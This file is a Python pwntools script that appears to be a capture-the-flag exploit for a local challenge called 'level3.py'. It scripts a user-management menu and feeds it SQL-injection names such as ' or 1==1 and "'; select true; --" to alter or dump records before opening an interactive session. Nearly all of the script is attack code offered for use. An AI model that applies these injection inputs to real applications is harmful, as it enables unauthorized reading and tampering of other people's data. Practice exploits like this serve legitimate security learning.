#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template level3.py
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = 'level3.py'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def dump():
    io.sendline("4")
    #print io.recvuntil('==>')
    print io.recv()

def addUser(name, num, phone):
        io.sendline("1")
        io.recvuntil('Name:')
        io.sendline(name)
        io.recvuntil('Age:')
        io.sendline(str(num))
        io.recvuntil('Phone:')
        io.sendline(str(phone))
        io.recvuntil('==>')
        sleep(0.1)

def removeUser(name):
        io.sendline("2")
        io.recvuntil('Name:')
        io.sendline(name)
    
def addUsers(num):
    for i in range(1,num):
        addUser('jake_'+str(i), str(i), str(i))
    
io = start()
addUsers(4)
addUser('\'==1', 123, 123)
addUser('', 123, 123)
addUser('\"\' or 1==1', 123, 123)
removeUser('jake_1')
removeUser('\' or 1==1')
addUser("'; select true; --", 1, 123)
dump()
io.interactive()

